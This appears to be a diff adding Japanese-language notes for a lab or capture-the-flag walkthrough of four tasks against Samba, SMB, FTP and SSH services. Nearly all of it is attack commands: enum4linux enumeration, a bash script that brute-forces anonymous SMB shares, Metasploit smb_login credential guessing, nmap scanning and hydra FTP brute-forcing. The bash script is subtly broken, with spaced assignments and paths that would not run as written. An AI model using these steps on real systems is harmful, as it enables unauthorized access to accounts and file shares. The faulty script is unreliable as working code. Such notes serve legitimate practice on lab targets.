@@ -1,1 +1,59 @@
+task1 samba共有
+1) ターミナルの軌道
+2) 以下のコマンドで、sambaを列挙
+enum4linux -a target domain
+3) 以下のコマンドでブルートフォースを実行するためのシェルスクリプトの作成
+「#!/bin/bash 
+
+# ターゲットとワードリストの場所を定義します
+TARGET= "ターゲットドメイン"
+ WORDLIST= "ワードリストのディレクトリ" 
+
+# ワードリストファイルが存在するかどうかを確認します
+if [ ! -f " $WORDLIST " ]; then 
+    echo  "Wordlist not found: $WORDLIST " 
+    exit 1 
+fi 
+
+# ワードリスト内の各共有をループします
+while  read -r SHARE; do 
+    echo  "Testing share: $SHARE "
+     smbclient // $TARGET / $SHARE -N -c "ls" &>/dev/null 
+
+    if [ $? -eq 0 ]; then 
+        echo  "[+] Anonymous access allowed for: $SHARE " 
+    else 
+        echo  "[-] Access denied for: $SHARE " 
+    fi 
+done < " $WORDLIST "」
+4) chmod +x シェルスクリプト
+5) ./シェルスクリプトの実行
+6) 以下のコマンドでブルートフォースで見つけた共有にアクセス
+smbclient //ターゲットドメイン -N
+
+task2 smbのユーザのパスコードの脆弱性
+1) msfconsoleを起動
+2) search type:auxiliary name:smb
+3) use auxiliary/scanner/smb/smb_login
+4) 基本情報の設定
+nano users.txt(列挙したユーザを一覧にする）
+set RHOSTS targetドメイン
+set USER_FILE users.txt
+set PASS_FILE ディレクトリの設定
+5) run
+6) 以下のコマンドでログイン
+smbclient //targetドメイン/ユーザ名 -U ユーザ名
+
+task3 ftpに対するログイン
+1) 以下のコマンドでftpのポート番号を明らかにする
+nmap -sC -sV -p- targetドメイン
+2) 以下のコマンドで、ftpにログイン
+ftp -p targetドメイン ポート番号
+3) hydraでブルートフォースを行う
+hydra -L users.txt -P パスワードディレクトリ ftp://ターゲットドメイン:ポート番号
+
+task4 権限のないユーザへのログイン
+1) ssh ターゲットドメイン
+
+
 
